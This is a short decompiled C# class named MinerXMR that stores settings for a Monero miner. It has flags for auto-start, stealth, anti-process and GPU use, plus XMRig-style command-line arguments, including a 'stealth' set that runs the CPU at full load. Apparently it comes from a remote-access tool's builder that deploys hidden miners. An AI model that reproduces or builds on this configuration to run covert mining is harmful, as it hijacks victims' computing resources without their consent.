using System;

namespace Server.Data
{
	// Token: 0x020000C4 RID: 196
	internal class MinerXMR
	{
		// Token: 0x0400055E RID: 1374
		public bool AutoStart;

		// Token: 0x0400055F RID: 1375
		public bool AntiProcess;

		// Token: 0x04000560 RID: 1376
		public bool Stealth;

		// Token: 0x04000561 RID: 1377
		public bool Gpu;

		// Token: 0x04000562 RID: 1378
		public string Args = "--asm=auto --randomx-mode=auto --randomx-no-rdmsr --cpu-memory-pool=1 --cpu-max-threads-hint=100 --cuda-bfactor-hint=10 --cuda-bsleep-hint=100 --url=127.0.0.1:3335";

		// Token: 0x04000563 RID: 1379
		public string ArgsStealh = "--asm=auto --randomx-mode=auto --randomx-no-rdmsr --cpu-memory-pool=1 --cpu-max-threads-hint=100 --cuda-bfactor-hint=10 --cuda-bsleep-hint=100 --cpu-priority=5 --cpu-no-yield --url=127.0.0.1:3335";
	}
}
